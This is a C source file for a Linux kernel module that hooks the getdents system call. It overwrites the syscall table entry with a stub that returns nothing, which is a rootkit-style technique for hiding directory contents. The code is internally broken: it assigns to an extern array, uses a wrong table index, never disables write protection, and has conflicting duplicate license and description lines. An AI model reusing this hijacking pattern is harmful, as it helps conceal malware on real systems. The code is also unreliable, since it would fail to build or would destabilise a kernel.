#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/unistd.h>
#include <linux/syscalls.h>
#include <linux/kallsyms.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Yann KOETH");
MODULE_DESCRIPTION("Loadable Kernel Module Syscall");
MODULE_VERSION("0.1");

#define SYS_CALL_TABLE "sys_call_table"

extern void* syscall_table[];

static void *originalGetDents = NULL;

static asmlinkage long hijackgetdents(void){

return 0;

}

static int init_syscall(void)
{
        syscall_table = (ulong *)kallsyms_lookup_name(SYS_CALL_TABLE);
        originalGetDents=syscall_table[sys_getdents];
        syscall_table[sys_getdents]=hijackgetdents;
        printk(KERN_INFO "Custom syscall loaded\n");
        return 0;
}

static void cleanup_syscall(void)
{
        syscall_table[sys_getdents]=originalGetDents;
        printk(KERN_INFO "Syscall at offset %d : %p\n", sys_getdents, (void *)syscall_table[sys_getdents]);
        printk(KERN_INFO "Custom syscall unloaded\n");
}

module_init(init_syscall);
module_exit(cleanup_syscall);


MODULE_LICENSE("GPL v2");
MODULE_DESCRIPTION("A kernel module to list process by their names");
